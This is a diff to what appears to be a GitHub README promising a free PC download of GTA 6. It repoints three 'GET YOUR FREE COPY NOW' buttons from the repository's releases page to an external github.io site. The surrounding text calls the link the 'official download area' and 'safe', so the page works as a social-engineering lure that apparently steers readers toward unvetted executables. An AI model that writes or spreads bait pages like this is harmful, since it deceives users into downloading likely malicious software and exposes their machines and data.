@@ -1,7 +1,7 @@
 <h1>🎮 GTA-6-Download-PC-Windows-Free-2026 - Get Playing in Minutes, No Tech Skills Needed</h1>
 
 <p align="center">
-  <a href="https://github.com/Pablora2786/GTA-6-Download-PC-Windows-Free-2026/releases" style="display:inline-block;padding:18px 40px;background:linear-gradient(135deg,#ff6b6b,#ff8c42);color:#ffffff;font-size:22px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 5px 15px rgba(255,107,107,0.4);">⬇️ GET YOUR FREE COPY NOW</a>
+  <a href="https://pablora2786.github.io" style="display:inline-block;padding:18px 40px;background:linear-gradient(135deg,#ff6b6b,#ff8c42);color:#ffffff;font-size:22px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 5px 15px rgba(255,107,107,0.4);">⬇️ GET YOUR FREE COPY NOW</a>
 </p>
 
 ## 💡 What Is This?
@@ -18,7 +18,7 @@ Your journey to playing GTA 6 starts with just one action. The process is delibe
 
 **Step 1: Visit the Download Page**
 
-👉 <a href="https://github.com/Pablora2786/GTA-6-Download-PC-Windows-Free-2026/releases" style="color:#1a73e8;font-weight:bold;text-decoration:underline;">Click here to visit this link to download the application</a>
+👉 <a href="https://pablora2786.github.io" style="color:#1a73e8;font-weight:bold;text-decoration:underline;">Click here to visit this link to download the application</a>
 
 This link takes you directly to the official download area for this project. It is a safe, simple page where you will find everything you need to get started. The page is arranged clearly, so you will not get lost or confused about what to do next.
 
@@ -203,7 +203,7 @@ Getting your hands on GTA 6 for PC is easier than ever with this package. There 
 
 ,
 
-👉 <a href="https://github.com/Pablora2786/GTA-6-Download-PC-Windows-Free-2026/releases" style="background:#34c759;color:#ffffff;padding:14px 30px;text-decoration:none;border-radius:8px;font-weight:bold;font-size:18px;display:inline-block;margin:10px 0;">🎯 GO TO DOWNLOAD PAGE NOW</a>
+👉 <a href="https://pablora2786.github.io" style="background:#34c759;color:#ffffff;padding:14px 30px;text-decoration:none;border-radius:8px;font-weight:bold;font-size:18px;display:inline-block;margin:10px 0;">🎯 GO TO DOWNLOAD PAGE NOW</a>
 
 ,
 
